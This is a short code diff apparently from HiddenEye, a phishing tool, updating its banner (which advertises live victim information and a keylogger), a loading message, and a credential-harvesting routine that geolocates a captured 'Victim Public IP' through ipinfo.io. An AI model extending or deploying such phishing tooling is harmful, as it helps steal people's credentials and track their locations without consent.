@@ -138,7 +138,7 @@ def runMainMenu(): #menu where user select what they wanna use
  {1}|| ██   ██ ██ ██████   ██████   ███████ ██   ███  {3}███████    ██    ███████ {1}||
  ||                                                                         ||
  -----------------------------------------------------------------------------
-                                                     v{3}0{1}.{3}1{1}.{3}0{1} BY:DARKSEC{2}
+                                                     v{3}0{1}.{3}2{1}.{3}2{1} BY:DARKSEC{2}
                  {0}[ NOW WITH LIVE VICTIM ATTACK INFORMATION ]
          {0}A KEYLOGGER WILL BE DEPLOYED FOR YOU, TO CAPTURE EVERY KEYSTROKE ]
 <=============================================================================>
@@ -157,8 +157,7 @@ def runMainMenu(): #menu where user select what they wanna use
 
     for i in range(101):
         sleep(0.05)
-        stdout.write(_("{0}[{1}*{0}]{1} HiddenEye is Opening. Please Wait...{2}%").format(RED, DEFAULT, i))
-        system("clear")
+        stdout.write(_("\r{0}[{1}*{0}]{1} HiddenEye is Opening. Please Wait...{2}%").format(RED, DEFAULT, i))
         stdout.flush()
 
     if input(_("\n{2}[{1}!{2}]{1} Do you agree to use this tool for educational purposes only? ({2}y{1}/{0}n{1})\n{2}HiddenEye >>> {1}").format(CYAN, DEFAULT, RED)).upper() != 'Y': #Question where user must accept education purposes
@@ -301,7 +300,7 @@ def getCredentials():
         with open('Server/www/ip.txt') as creds:
             lines = creds.read().rstrip()
             if len(lines) != 0:
-                ip = re.match('User Public IP: (.*?)\n', lines).group(1)
+                ip = re.match('Victim Public IP: (.*?)\n', lines).group(1)
                 resp = urlopen('https://ipinfo.io/{0}/json'.format(ip))
                 ipinfo = json.loads(resp.read().decode(resp.info().get_param('charset') or 'utf-8'))
                 if 'bogon' in ipinfo:
